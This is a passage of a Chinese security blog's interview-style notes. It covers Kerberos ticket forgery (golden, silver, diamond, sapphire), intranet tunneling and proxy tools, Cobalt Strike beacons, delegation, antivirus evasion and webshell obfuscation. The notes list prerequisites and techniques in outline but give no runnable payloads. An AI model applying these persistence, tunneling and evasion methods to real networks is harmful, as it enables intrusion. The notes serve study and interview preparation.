<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">黄金票据</span><br><span class="line"></span><br><span class="line">黄金票据就是伪造krbtgt用户的TGT票据(krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户)，可以通过黄金票据可以登录域内其他用户</span><br><span class="line"></span><br><span class="line">利用前提：</span><br><span class="line">1. 拿到域控,适合做权限维持</span><br><span class="line">2. 有krbtgt用户的hash值(aes-hash ntlm-hash等都可以)</span><br><span class="line">3. 目标域名：我这里是rootkit.org</span><br><span class="line">4. 目标域的sid</span><br><span class="line">5. 要模拟的用户账户名称：例如 Administrator</span><br><span class="line"></span><br><span class="line">白银票据主要是伪造的 Kerberos Ticket Grant Service （TGS） 票证是获取单独服务帐户的NTML HASH</span><br><span class="line"></span><br><span class="line">1. 目标域名：我这里是rootkit.org</span><br><span class="line">2. 目标域的sid：</span><br><span class="line">3. 要模拟的用户账户名称：例如 Administrator</span><br><span class="line">4. 要模拟的用户RID：RID是SID右边的数字，例如管理员是500</span><br><span class="line">5. 服务名称</span><br></pre></td></tr></table></figure>

<h3 id="钻石票据和蓝宝石票据"><a href="#钻石票据和蓝宝石票据" class="headerlink" title="钻石票据和蓝宝石票据"></a>钻石票据和蓝宝石票据</h3><p>钻石票证攻击利用了域控制器 (DC) 请求的真实 TGT 进行解密和重新加密进行票据攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 黄金票据与钻石票据区别</span><br><span class="line">  充分利用了能够从头开始伪造票据授予票据 (TGT) 的优势，而钻石票据则利用了能够解密和重新加密从域控制器 (DC) 请求的真实 TGT 的优势。</span><br><span class="line">  </span><br><span class="line">2. 钻石票据的利用思路</span><br><span class="line">	使用低权限的用户向域控请求一个普通的 TGT，随后进行解密修改签名和重新加密即可，当然这些事情Rubeus.exe会自动帮我们完成，我们只需要提供信息即可。</span><br><span class="line">	</span><br><span class="line">3. 利用条件</span><br><span class="line">  krbkey</span><br><span class="line">  低权限用户user:micle</span><br><span class="line">  用户密码password:Admin12345</span><br><span class="line">  domain:</span><br><span class="line">  dc:</span><br><span class="line">  ticketuser://伪造的票据用户名可以任意，不需要域中存在该用户</span><br></pre></td></tr></table></figure>

<p><strong>什么是PAC</strong><br>PAC 是一种传递域控制器 (DC)提供的授权相关信息的结构。身份验证协议使用 PAC 来验证身份以传输授权信息，从而控制对资源的访问。说白了就是来验证身份是否有效的。</p>
<p><strong>蓝宝石票据</strong>与钻石票据类似，票据不是伪造的，而是通过请求后获得的合法票据。</p>
<p>他们的区别在于<code>PAC</code>的<strong>修改方式。</strong>钻石票据是修改了合法<code>PAC</code>以添加特权组。在蓝宝石票据中，高权限用户<code>PAC</code>是通过<code>S4U2Self+U2U</code>获得的，然后该<code>PAC</code>会替换原来的<code>PAC</code>，由于该票据是完全合法元素组合起来的，所以是最难检测的票据。</p>
<h2 id="内网工具"><a href="#内网工具" class="headerlink" title="内网工具"></a>内网工具</h2><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><ol>
<li>ngrok</li>
</ol>
<p>它可以将内网中的 HTTP 和 TCP 服务映射到公网上，支持多种操作系统和语言。</p>
<ol start="2">
<li>frp</li>
</ol>
<p>frp 是另一款流行的内网穿透工具，与 ngrok 类似，它可以将内网中的 TCP 和 UDP 服务映射到公网上，同时支持多种操作系统和语言。frp 的安装和使用也非常简单，只需要下载对应的客户端进行安装即可。</p>
<h3 id="密码相关"><a href="#密码相关" class="headerlink" title="密码相关"></a>密码相关</h3><ol>
<li>Exchange 密码喷洒</li>
<li>mimikatz </li>
<li>hydra 九头蛇</li>
</ol>
<h3 id="集成工具"><a href="#集成工具" class="headerlink" title="集成工具"></a>集成工具</h3><ol>
<li>CS</li>
<li>MSF</li>
<li>Fscan 大工具</li>
</ol>
<h3 id="内网不出网机器上线方法"><a href="#内网不出网机器上线方法" class="headerlink" title="内网不出网机器上线方法"></a><strong>内网不出网机器上线方法</strong></h3><h4 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a><strong>隧道技术</strong></h4><p>我们在内网<strong>协议被封杀</strong>的时候使用隧道技术。</p>
<p>隧道技术是一种在网络中创建私密通道以在不安全或公共网络上安全传输数据的方法。它允许将一种网络协议的数据封装在另一种网络协议的数据包中传输。</p>
<p>隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙与对方进行通信；数据包到达目的地时，将数据包还原，并且将还原后的数据包发送到对应的服务器上。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://evalexp.top/p/59671/#%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF">网络层</a>：IPv6隧道、ICMP隧道、GRE隧道</li>
<li>传输层：TCP隧道、UDP隧道、常规端口转发</li>
<li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li>
</ul>
<p><strong>检测协议的方法</strong></p>
<ul>
<li><strong>ICMP协议：ping</strong> 			</li>
<li><strong>TCP协议：nc\ncat</strong></li>
<li><strong>HTTP协议：curl\wget</strong></li>
<li><strong>DNS协议：nslookup\dig</strong></li>
</ul>
<p><strong>工具</strong></p>
<ul>
<li>ICMP协议：Pingtunnel</li>
<li>TCP隧道：</li>
<li>HTTP隧道：Neo-reGeorg</li>
<li>DNS协议：dnscat2</li>
<li>Sockets：FRP + proxifier</li>
</ul>
<h4 id="代理技术"><a href="#代理技术" class="headerlink" title="代理技术"></a><strong>代理技术</strong></h4><p>正向代理、反向代理</p>
<p>正向连接，反向连接。</p>
<p>正向：没做什么规则限制，那就直接正向通过跳板机去连接</p>
<p>反向：入站规则限制，只能通过目标机器反向连接到跳板机，然后上线</p>
<p><strong>网络通信不通</strong>的时候使用代理技术</p>
<ol>
<li><strong>SMB Beacon上线不出网主机</strong></li>
</ol>
<p>​	（1）该方法通过已有的父Beacon使用SMB协议进行正向连接不出网机器。</p>
<p>​	（2）利用条件：目标开启445端口、有用户名和hash</p>
<ol start="2">
<li><strong>正向TCP Beacon</strong></li>
<li><strong>反向TCP Beacon</strong></li>
<li><strong>HTTP 代理上线 ，goproxy项目做代理</strong></li>
</ol>
<h3 id="约束委派和非约束委派"><a href="#约束委派和非约束委派" class="headerlink" title="约束委派和非约束委派"></a>约束委派和非约束委派</h3><p><strong>非约束委派</strong></p>
<p>​	在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
<p><strong>约束委派</strong></p>
<p>​	<strong>由于非约束委派的不安全性</strong>，微软在windows2003中发布了约束委派的功能，在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，<strong>不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</strong></p>
<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>采取shellcode方式，来借助第三方直接加载到内存中、采取调用微软自带来执行Shellcode，利用微软的签名，从而绕过反病毒软件。</p>
<h3 id="一句话木马免杀"><a href="#一句话木马免杀" class="headerlink" title="一句话木马免杀"></a>一句话木马免杀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">一、assert()</span><br><span class="line">如果过滤了eval，可以使用assert绕过</span><br><span class="line"></span><br><span class="line">二、字符串拼接</span><br><span class="line">当过滤了eval、assert两个关键字时，可以用字符串拼接的方式。介绍substr_replace()函数</span><br><span class="line"></span><br><span class="line">三、函数</span><br><span class="line">可以利用函数来构造一句话木马</span><br><span class="line"></span><br><span class="line">四 base64加解密</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>负载均衡是在支持应用程序的资源池中平均分配网络流量的一种方法。</p>
<p>为了同时处理数百万用户的流量，使用一些资源服务器，充当不可见的协调者，确保均等使用所有资源服务器。将用户请求分摊到不同的服务器上处理，以提高系统整体的并发处理能力以及可靠性</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drblack.top">Drblack</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drblack.top/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/">https://drblack.top/2023/05/21/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drblack.top" target="_blank">Drblack'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></div><div class="post_share"><div class="social-share" data-image="/img/1000.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="Nginx解析漏洞复现及原理解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Nginx解析漏洞复现及原理解析</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/20/%E4%B8%80%E6%AE%B5%E7%AE%80%E8%BF%B0/" title="一段简述"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">一段简述</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/08/MAC%E5%AF%BC%E5%85%A5%E9%9D%B6%E6%9C%BA/" title="MAC导入红日靶机"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-08</div><div class="title">MAC导入红日靶机</div></div></a></div><div><a href="/2023/11/02/Kerberos%E5%8D%8F%E8%AE%AE/" title="Kerberos协议分析（数据包）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">Kerberos协议分析（数据包）</div></div></a></div><div><a href="/2023/05/25/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" title="Nginx解析漏洞复现及原理解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-25</div><div class="title">Nginx解析漏洞复现及原理解析</div></div></a></div><div><a href="/2023/11/08/PTH%E3%80%81PTK%E3%80%81PTT%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="PTH、PTT、PTK 攻击总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-08</div><div class="title">PTH、PTT、PTK 攻击总结</div></div></a></div><div><a href="/2023/11/04/php-SER-libs%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98/" title="php-SER-libs靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-04</div><div class="title">php-SER-libs靶场</div></div></a></div><div><a href="/2023/10/20/upload-labs-Pass1-21%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" title="upload-labs Pass1-21通关笔记(详细版)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-20</div><div class="title">upload-labs Pass1-21通关笔记(详细版)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1000.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Drblack</div><div class="author-info__description">努力就会一直幸运</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/drblack000"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drblack000" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:drblack_di@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">网络基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80%E6%AE%B5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">私有地址段：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ISO%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">ISO七层模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP%E4%B8%8EUDP%E5%9F%BA%E6%9C%AC%E5%8C%BA%E5%88%AB"><span class="toc-number">1.3.</span> <span class="toc-text">TCP与UDP基本区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP%E6%8F%A1%E6%89%8B%E5%92%8C%E6%8C%A5%E6%89%8B"><span class="toc-number">1.4.</span> <span class="toc-text">TCP握手和挥手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%92%8CHTTPS"><span class="toc-number">1.5.</span> <span class="toc-text">HTTP和HTTPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL"><span class="toc-number">1.6.</span> <span class="toc-text">SSL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">1.7.</span> <span class="toc-text">DNS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OWSTP10"><span class="toc-number">2.</span> <span class="toc-text">OWSTP10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">4.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">5.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.0.1.</span> <span class="toc-text">本地文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.0.2.</span> <span class="toc-text">远程文件包含漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF"><span class="toc-number">8.</span> <span class="toc-text">CRLF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">9.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">10.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text">序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">12.</span> <span class="toc-text">常用分析工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">13.</span> <span class="toc-text">linux常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94linux"><span class="toc-number">14.</span> <span class="toc-text">应急响应linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows"><span class="toc-number">15.</span> <span class="toc-text">应急响应windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">16.</span> <span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90"><span class="toc-number">17.</span> <span class="toc-text">溯源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AF%E6%8A%A5"><span class="toc-number">18.</span> <span class="toc-text">误报</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEWebshell%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">19.</span> <span class="toc-text">寻找Webshell的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">20.</span> <span class="toc-text">常见加密算法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95"><span class="toc-number">20.1.</span> <span class="toc-text">对称密码算法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DES"><span class="toc-number">20.1.1.</span> <span class="toc-text">DES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AES"><span class="toc-number">20.1.2.</span> <span class="toc-text">AES</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E4%BD%93%E7%B3%BB"><span class="toc-number">20.2.</span> <span class="toc-text">非对称加密体系</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA%E7%AE%97%E6%B3%95"><span class="toc-number">20.2.1.</span> <span class="toc-text">RSA算法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D"><span class="toc-number">20.3.</span> <span class="toc-text">数字签名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">21.</span> <span class="toc-text">流量特征</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80"><span class="toc-number">21.1.</span> <span class="toc-text">菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">21.2.</span> <span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E"><span class="toc-number">21.3.</span> <span class="toc-text">冰蝎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">21.4.</span> <span class="toc-text">哥斯拉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">21.5.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F"><span class="toc-number">21.6.</span> <span class="toc-text">ICMP隧道流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j"><span class="toc-number">21.7.</span> <span class="toc-text">Log4j</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">21.8.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF"><span class="toc-number">21.9.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS"><span class="toc-number">21.10.</span> <span class="toc-text">CS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">22.</span> <span class="toc-text">中间件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS"><span class="toc-number">22.1.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache"><span class="toc-number">22.2.</span> <span class="toc-text">Apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx"><span class="toc-number">22.3.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat"><span class="toc-number">22.4.</span> <span class="toc-text">Tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic"><span class="toc-number">22.5.</span> <span class="toc-text">weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson"><span class="toc-number">22.6.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-1"><span class="toc-number">22.7.</span> <span class="toc-text">Log4j</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct2"><span class="toc-number">22.8.</span> <span class="toc-text">Struct2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E5%8A%A0%E5%9B%BA"><span class="toc-number">23.</span> <span class="toc-text">SSH加固</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-number">24.</span> <span class="toc-text">安全加固</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%92%E6%9F%A5"><span class="toc-number">25.</span> <span class="toc-text">内存马排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">26.</span> <span class="toc-text">进程排查思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E6%A1%86%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">27.</span> <span class="toc-text">登陆框可能存在的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%AD%97%E6%AE%B5"><span class="toc-number">28.</span> <span class="toc-text">HTTP字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E6%8E%92%E6%9F%A5"><span class="toc-number">29.</span> <span class="toc-text">挖矿木马排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-cookie-token%E5%8C%BA%E5%88%AB"><span class="toc-number">30.</span> <span class="toc-text">session cookie token区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89cdn%E7%9A%84%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP"><span class="toc-number">30.1.</span> <span class="toc-text">有cdn的网站如何获取真实IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">30.2.</span> <span class="toc-text">redis未授权漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E7%AB%AF%E5%8F%A3"><span class="toc-number">31.</span> <span class="toc-text">常见的高危端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E%E6%B5%81%E7%A8%8B"><span class="toc-number">32.</span> <span class="toc-text">挖洞流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">33.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-1"><span class="toc-number">33.1.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jboss"><span class="toc-number">33.2.</span> <span class="toc-text">Jboss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">33.3.</span> <span class="toc-text">shiro反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro"><span class="toc-number">33.4.</span> <span class="toc-text">Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shiro%E6%9C%89key%E6%97%A0%E9%93%BE%E5%88%A9%E7%94%A8"><span class="toc-number">33.4.1.</span> <span class="toc-text">shiro有key无链利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">33.5.</span> <span class="toc-text">PHP反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83"><span class="toc-number">34.</span> <span class="toc-text">常见提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83"><span class="toc-number">34.1.</span> <span class="toc-text">windows提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LINUX%E6%8F%90%E6%9D%83"><span class="toc-number">34.2.</span> <span class="toc-text">LINUX提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">35.</span> <span class="toc-text">内网渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">35.1.</span> <span class="toc-text">黄金票据和白银票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3%E7%A5%A8%E6%8D%AE%E5%92%8C%E8%93%9D%E5%AE%9D%E7%9F%B3%E7%A5%A8%E6%8D%AE"><span class="toc-number">35.2.</span> <span class="toc-text">钻石票据和蓝宝石票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7"><span class="toc-number">36.</span> <span class="toc-text">内网工具</span></a><ol 